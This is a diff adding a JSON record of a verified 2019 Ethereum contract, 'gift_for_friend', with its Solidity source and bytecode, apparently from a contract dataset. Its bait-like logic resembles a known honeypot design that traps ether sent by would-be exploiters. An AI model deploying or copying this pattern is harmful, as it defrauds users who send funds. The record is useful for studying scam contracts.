@@ -1,0 +1,14 @@
+{
+  "address": "0x15873a4ec0b2b0be91844b0387cf6b8386226650",
+  "chain": "ETH",
+  "chainID": 1,
+  "verifier": "etherscan.io",
+  "commonName": "",
+  "contractName": "gift_for_friend",
+  "compilerVersion": "v0.4.20+commit.3155dd80",
+  "optimization": true,
+  "runs": "200",
+  "evmVersion": "default",
+  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-01-28\n*/\n\npragma solidity ^0.4.20;\n\ncontract gift_for_friend\n{\n    address sender;\n    \n    address reciver;\n    \n    bool closed = false;\n    \n    uint unlockTime;\n \n    function SetGiftFor(address _reciver)\n    public\n    payable\n    {\n        if( (!closed&&(msg.value > 3 ether)) || sender==0x0 )\n        {\n            sender = msg.sender;\n            reciver = _reciver;\n            unlockTime = now;\n        }\n    }\n    \n    function SetGiftTime(uint _unixTime)\n    public\n    {\n        if(msg.sender==sender&&now>unlockTime)\n        {\n            unlockTime = _unixTime;\n        }\n    }\n    \n    function GetGift()\n    public\n    payable\n    {\n        if(reciver==msg.sender&&now>unlockTime)\n        {\n            selfdestruct(msg.sender);\n        }\n    }\n    \n    function CloseGift()\n    public\n    {\n        if(sender == msg.sender && reciver != 0x0 )\n        {\n           closed=true;\n        }\n    }\n    \n    function() public payable{}\n}",
+  "bytecode": "60606040526001805460a060020a60ff0219169055341561001f57600080fd5b6102228061002e6000396000f3006060604052600436106100615763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416633f7e21208114610063578063bbcd99f114610076578063bea948c81461008a578063dac47a7114610092575b005b341561006e57600080fd5b6100616100a8565b610061600160a060020a036004351661010d565b61006161019d565b341561009d57600080fd5b6100616004356101cd565b60005433600160a060020a0390811691161480156100d05750600154600160a060020a031615155b1561010b576001805474ff00000000000000000000000000000000000000001916740100000000000000000000000000000000000000001790555b565b60015474010000000000000000000000000000000000000000900460ff1615801561013f57506729a2241af62c000034115b806101535750600054600160a060020a0316155b1561019a5760008054600160a060020a0333811673ffffffffffffffffffffffffffffffffffffffff19928316179092556001805492841692909116919091179055426002555b50565b60015433600160a060020a0390811691161480156101bc575060025442115b1561010b5733600160a060020a0316ff5b60005433600160a060020a0390811691161480156101ec575060025442115b1561019a576002555600a165627a7a72305820277a6b09819226351410d2e6fe00e5982c70c70e23b374ad39e99cac7a866e9c0029"
+}
